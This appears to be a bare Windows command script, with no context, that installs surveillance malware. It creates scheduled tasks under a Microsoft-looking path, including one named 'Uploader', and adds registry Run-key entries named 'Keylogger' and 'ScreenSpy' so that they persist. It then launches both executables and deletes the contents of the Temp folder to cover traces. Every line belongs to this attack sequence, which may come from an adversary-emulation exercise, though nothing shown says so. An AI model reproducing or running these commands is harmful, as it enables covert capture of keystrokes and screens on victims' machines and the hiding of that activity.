

schtasks.exe /create /TN "Microsoft\Windows\DynAmite\DynAmite" /XML C:\Windows\Temp\dynatask.xml

schtasks.exe /create /TN "Microsoft\Windows\DynAmite\Uploader" /XML C:\Windows\Temp\upltask.xml

SCHTASKS /run /TN "Microsoft\Windows\DynAmite\DynAmite"

New-ItemProperty -path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name Keylogger -PropertyType String -Value "C:\Windows\dynakey.exe"
New-ItemProperty -path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name ScreenSpy -PropertyType String -Value "C:\Windows\dynascr.exe"

C:\Windows\dynakey.exe
C:\Windows\dynascr.exe

Remove-Item "C:\Windows\Temp\*"

